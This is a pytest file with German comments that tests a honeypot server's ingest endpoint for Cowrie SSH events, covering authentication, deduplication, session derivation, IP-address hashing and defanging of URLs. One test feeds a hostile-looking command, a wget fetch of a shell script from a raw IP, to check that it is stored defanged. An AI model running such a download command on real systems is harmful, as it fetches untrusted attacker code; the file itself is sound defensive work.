"""POST /ingest gegen eine echte Datenbank.

Diese Tests brauchen PostgreSQL (Marker ``db``) und laufen im Container auf dem
Hauptserver, siehe ``server/README.md``. Sie spielen die echten Beispiel-Logs
vom Sensor ein und prüfen danach, was in der Datenbank steht — vor allem, dass
dort keine Adresse eines Beteiligten steht.
"""

from __future__ import annotations

import json
from typing import Any

import pytest
from sqlalchemy import func, select, text

from app.models import Command, Event, Session

pytestmark = pytest.mark.db

TOKEN = "t" * 64
KEY = "k" * 64


@pytest.fixture
def client(migrated, database_url: str, monkeypatch):
    """Die App, verbunden mit der frisch migrierten Testdatenbank."""
    from fastapi.testclient import TestClient
    from sqlalchemy.engine import make_url

    from app.config import get_settings
    from app.main import create_app

    url = make_url(database_url)
    monkeypatch.setenv("ENVIRONMENT", "test")
    monkeypatch.setenv("POSTGRES_HOST", url.host or "db")
    monkeypatch.setenv("POSTGRES_PORT", str(url.port or 5432))
    monkeypatch.setenv("POSTGRES_USER", url.username or "honeypot")
    monkeypatch.setenv("POSTGRES_PASSWORD", url.password or "")
    monkeypatch.setenv("POSTGRES_DB", url.database or "honeypot_test")
    monkeypatch.setenv("INGEST_TOKEN", TOKEN)
    monkeypatch.setenv("IP_HMAC_KEY", KEY)
    # Ohne MMDB läuft der Ingest weiter, nur ohne Land (Schritt 4.3).
    monkeypatch.setenv("IPINFO_DB_PATH", "/nicht/vorhanden.mmdb")

    get_settings.cache_clear()
    app = create_app()
    with TestClient(app) as test_client:
        yield test_client
    get_settings.cache_clear()


def send(client, events: list[dict[str, Any]], token: str = TOKEN):
    return client.post("/ingest", json=events, headers={"Authorization": f"Bearer {token}"})


def scalar(engine, statement):
    with engine.connect() as connection:
        return connection.execute(statement).scalar()


# --- Berechtigung -----------------------------------------------------------


def test_without_a_token_nothing_is_accepted(client, cowrie_events):
    assert client.post("/ingest", json=cowrie_events[:1]).status_code == 401


def test_a_wrong_token_is_refused(client, cowrie_events):
    assert send(client, cowrie_events[:1], token="falsch").status_code == 401


def test_the_answer_does_not_say_what_was_wrong(client):
    without = client.post("/ingest", json=[])
    wrong = client.post("/ingest", json=[], headers={"Authorization": "Bearer falsch"})
    assert without.json() == wrong.json()


# --- Annahme und Idempotenz -------------------------------------------------


def test_a_batch_of_real_events_is_accepted(client, cowrie_events):
    response = send(client, cowrie_events)
    assert response.status_code == 200
    body = response.json()
    assert body["accepted"] == len(cowrie_events)
    assert body["rejected"] == 0, body["reasons"]


def test_sending_the_same_batch_twice_changes_nothing(client, cowrie_events, migrated):
    send(client, cowrie_events)
    stored = scalar(migrated, select(func.count()).select_from(Event))

    again = send(client, cowrie_events).json()
    assert again["accepted"] == 0
    assert again["duplicates"] == len(cowrie_events)
    assert scalar(migrated, select(func.count()).select_from(Event)) == stored


def test_unknown_eventids_are_counted_and_not_stored(client, cowrie_events, migrated):
    fremd = dict(cowrie_events[0], eventid="cowrie.unbekannt")
    body = send(client, [fremd]).json()
    assert body["rejected"] == 1
    assert "unbekannte eventid" in body["reasons"]
    assert scalar(migrated, select(func.count()).select_from(Event)) == 0


def test_a_batch_that_is_too_large_is_refused(client, cowrie_events):
    too_many = [dict(cowrie_events[0], session=f"s{i:011d}") for i in range(501)]
    assert send(client, too_many).status_code == 413


def test_something_that_is_not_json_is_refused(client):
    response = client.post(
        "/ingest",
        content=b"kein json",
        headers={"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"},
    )
    assert response.status_code == 422


def test_a_single_object_is_taken_as_one_event(client, cowrie_events, migrated):
    """Ein Stapel mit einem Ereignis kommt ohne Klammern an."""
    body = send(client, [cowrie_events[0]]).json()
    assert body["accepted"] == 1
    again = client.post(
        "/ingest", json=cowrie_events[1], headers={"Authorization": f"Bearer {TOKEN}"}
    ).json()
    assert again["accepted"] == 1


def test_one_line_per_event_also_works(client, cowrie_events):
    """Falls Vector die Stapel als NDJSON schickt statt als Array."""
    lines = "\n".join(json.dumps(event) for event in cowrie_events[:5])
    response = client.post(
        "/ingest",
        content=lines.encode("utf-8"),
        headers={"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/x-ndjson"},
    )
    assert response.status_code == 200
    assert response.json()["accepted"] == 5


# --- Abgeleitete Sitzungen --------------------------------------------------


def test_sessions_are_derived_from_the_events(client, cowrie_events, migrated):
    send(client, cowrie_events)
    expected = len({event["session"] for event in cowrie_events})
    assert scalar(migrated, select(func.count()).select_from(Session)) == expected


def test_interactive_and_exec_are_distinguished(client, cowrie_events, migrated):
    """Interaktiv ist, wer eine Terminalgröße meldet; sonst ist es ein Exec-Aufruf."""
    send(client, cowrie_events)
    with_pty = {e["session"] for e in cowrie_events if e["eventid"] == "cowrie.client.size"}
    with_commands = {e["session"] for e in cowrie_events if e["eventid"] == "cowrie.command.input"}

    interactive = scalar(migrated, select(func.count()).select_from(Session).where(Session.interactive.is_(True)))
    exec_calls = scalar(migrated, select(func.count()).select_from(Session).where(Session.interactive.is_(False)))
    assert interactive == len(with_pty)
    assert exec_calls == len(with_commands - with_pty)


def test_sessions_without_commands_stay_undecided(client, cowrie_events, migrated):
    send(client, cowrie_events)
    undecided = scalar(migrated, select(func.count()).select_from(Session).where(Session.interactive.is_(None)))
    with_commands = {e["session"] for e in cowrie_events if e["eventid"] == "cowrie.command.input"}
    assert undecided == len({e["session"] for e in cowrie_events}) - len(with_commands)


def test_commands_are_counted_and_numbered(client, cowrie_events, migrated):
    send(client, cowrie_events)
    total = sum(1 for e in cowrie_events if e["eventid"] == "cowrie.command.input")
    assert scalar(migrated, select(func.count()).select_from(Command)) == total
    assert scalar(migrated, select(func.sum(Session.command_count))) == total
    # Die Nummerierung beginnt je Sitzung bei 1.
    assert scalar(migrated, select(func.min(Command.sequence))) == 1


def test_login_data_and_client_details_land_in_the_session(client, cowrie_events, migrated):
    send(client, cowrie_events)
    with_login = scalar(
        migrated, select(func.count()).select_from(Session).where(Session.login_username.isnot(None))
    )
    expected = len({e["session"] for e in cowrie_events if e["eventid"].startswith("cowrie.login.")})
    assert with_login == expected
    assert scalar(migrated, select(func.count()).select_from(Session).where(Session.hassh.isnot(None))) > 0
    assert scalar(migrated, select(func.count()).select_from(Session).where(Session.ended_at.isnot(None))) > 0


def test_the_session_keeps_the_earliest_timestamp(client, cowrie_events, migrated):
    """Auch wenn der Stapel unsortiert ankommt."""
    send(client, list(reversed(cowrie_events)))
    first = min(e["timestamp"] for e in cowrie_events if e["session"] == cowrie_events[0]["session"])
    started = scalar(
        migrated,
        select(Session.started_at).where(Session.cowrie_session == cowrie_events[0]["session"]),
    )
    assert started.isoformat().startswith(first[:19])


# --- Die wichtigste Zusage --------------------------------------------------


def test_no_address_of_a_participant_is_stored_anywhere(client, cowrie_events, migrated):
    send(client, cowrie_events)

    addresses = {e[field] for e in cowrie_events for field in ("src_ip", "dst_ip") if e.get(field)}
    assert addresses, "die Fixtures haben keine Adressen"

    with migrated.connect() as connection:
        dump = []
        for table in ("sessions", "events", "commands"):
            rows = connection.execute(text(f"SELECT to_jsonb(t) FROM {table} AS t")).scalars().all()
            dump.extend(json.dumps(row, ensure_ascii=False) for row in rows)
    everything = "\n".join(dump)

    for address in addresses:
        assert address not in everything, f"{address} steht in der Datenbank"
        # Auch die entschärfte Schreibweise wäre noch die Adresse.
        assert address.replace(".", "[.]") not in everything


def test_the_hash_is_stored_instead(client, cowrie_events, migrated):
    send(client, cowrie_events)
    hashes = scalar(migrated, select(func.count(func.distinct(Session.ip_hash))))
    sources = len({e["src_ip"] for e in cowrie_events if e.get("src_ip")})
    assert hashes == sources
    assert scalar(migrated, select(func.min(func.length(Session.ip_hash)))) == 64


def test_a_command_with_a_url_is_stored_defanged(client, cowrie_events, migrated):
    base = next(e for e in cowrie_events if e["eventid"] == "cowrie.command.input")
    event = dict(base, input="wget http://45.9.148.99/x.sh", timestamp="2026-09-17T15:00:00.000000Z")
    event.pop("message", None)
    send(client, [event])

    stored = scalar(migrated, select(Command.command).order_by(Command.id.desc()))
    assert stored == "wget hxxp://45[.]9[.]148[.]99/x.sh"


def test_without_the_ipinfo_database_the_session_has_no_country(client, cowrie_events, migrated):
    """Ein fehlender Download darf keine Ereignisse kosten (Schritt 4.3)."""
    send(client, cowrie_events)
    assert scalar(migrated, select(func.count()).select_from(Session).where(Session.country.isnot(None))) == 0
    assert scalar(migrated, select(func.count()).select_from(Session)) > 0
